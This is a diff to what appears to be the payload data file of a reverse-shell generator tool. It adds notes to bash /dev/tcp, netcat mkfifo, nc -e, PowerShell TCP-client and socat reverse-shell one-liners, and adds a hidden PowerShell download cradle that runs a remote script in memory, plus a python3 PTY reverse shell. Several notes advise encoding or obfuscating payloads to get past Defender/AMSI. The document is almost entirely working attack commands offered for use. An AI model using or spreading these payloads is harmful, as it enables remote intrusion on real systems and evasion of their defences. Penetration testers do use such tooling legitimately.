@@ -31,7 +31,7 @@ export const ALL_SHELL_ITEMS: ShellItem[] = [
     "platform": "Linux",
     "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
     "listener": "nc -lvnp {port}",
-    "notes": "",
+    "notes": "The classic Linux one-liner. Needs a real bash (not dash). On /bin/sh-only hosts, use the nc mkfifo method instead.",
     "extension": ".sh",
     "isFullScript": false
   },
@@ -91,7 +91,7 @@ export const ALL_SHELL_ITEMS: ShellItem[] = [
     "platform": "Linux",
     "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
     "listener": "nc -lvnp {port}",
-    "notes": "",
+    "notes": "Works with OpenBSD netcat (no -e flag). The portable fallback when nc -e is unavailable.",
     "extension": ".txt",
     "isFullScript": false
   },
@@ -103,7 +103,7 @@ export const ALL_SHELL_ITEMS: ShellItem[] = [
     "platform": "Linux",
     "command": "nc {ip} {port} -e {shell}",
     "listener": "nc -lvnp {port}",
-    "notes": "",
+    "notes": "The -e flag only exists on 'traditional'/BusyBox netcat, not the common OpenBSD nc. If -e is missing, use the nc mkfifo variant.",
     "extension": ".txt",
     "isFullScript": false
   },
@@ -475,7 +475,7 @@ export const ALL_SHELL_ITEMS: ShellItem[] = [
     "platform": "Both",
     "command": "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
     "listener": "nc -lvnp {port}",
-    "notes": "",
+    "notes": "Defender/AMSI often flags this in plaintext. Use the PS ENC encoding toggle (produces -enc) or obfuscate if blocked.",
     "extension": ".ps1",
     "isFullScript": false
   },
@@ -499,7 +499,7 @@ export const ALL_SHELL_ITEMS: ShellItem[] = [
     "platform": "Both",
     "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
     "listener": "nc -lvnp {port}",
-    "notes": "",
+    "notes": "Defender/AMSI often flags this in plaintext. Use the PS ENC encoding toggle (produces -enc) or obfuscate if blocked.",
     "extension": ".ps1",
     "isFullScript": false
   },
@@ -516,30 +516,28 @@ export const ALL_SHELL_ITEMS: ShellItem[] = [
     "isFullScript": false
   },
   {
-    "id": "rev-powershell-3-base64",
-    "name": "PowerShell #3 (Base64)",
+    "id": "rev-powershell-iex-cradle",
+    "name": "PowerShell IEX Download Cradle",
     "category": "Reverse",
     "language": "PowerShell",
     "platform": "Both",
-    "command": "",
-    "listener": "nc -lvnp {port}",
-    "notes": "",
+    "command": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/rev.ps1')\"",
+    "listener": "python3 -m http.server {port}",
+    "notes": "Stager, not a direct shell. Hosts rev.ps1 from your box and runs it in memory; put your real reverse-shell .ps1 at the served path and run a separate nc listener for the callback. Often flagged by AMSI/Defender.",
     "extension": ".ps1",
-    "isFullScript": false,
-    "unavailable": true
+    "isFullScript": false
   },
   {
-    "id": "rev-powershell-5-stderr-support-base64",
-    "name": "PowerShell #5 (stderr support) (Base64)",
+    "id": "rev-python3-pty",
+    "name": "Python3 PTY (interactive)",
     "category": "Reverse",
-    "language": "PowerShell",
-    "platform": "Both",
-    "command": "",
+    "language": "Python",
+    "platform": "Linux",
+    "command": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"{shell}\")'",
     "listener": "nc -lvnp {port}",
-    "notes": "",
-    "extension": ".ps1",
-    "isFullScript": false,
-    "unavailable": true
+    "notes": "Spawns a PTY on connect, so you land in a fully interactive TTY with no manual stty upgrade. Needs python3 on the target.",
+    "extension": ".py",
+    "isFullScript": false
   },
   {
     "id": "rev-p0wny-shell-webshell",
@@ -585,7 +583,7 @@ export const ALL_SHELL_ITEMS: ShellItem[] = [
     "platform": "Linux",
     "command": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
     "listener": "nc -lvnp {port}",
-    "notes": "",
+    "notes": "Reliable on most Linux targets with python3. Upgrade to a full TTY afterward (see the TTY Upgrade category).",
     "extension": ".py",
     "isFullScript": false
   },
@@ -669,7 +667,7 @@ export const ALL_SHELL_ITEMS: ShellItem[] = [
     "platform": "Linux",
     "command": "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
     "listener": "socat file:`tty`,raw,echo=0 TCP-L:{port}",
-    "notes": "",
+    "notes": "Gives a fully interactive TTY in one step. Requires socat on the target.",
     "extension": ".txt",
     "isFullScript": false
   },
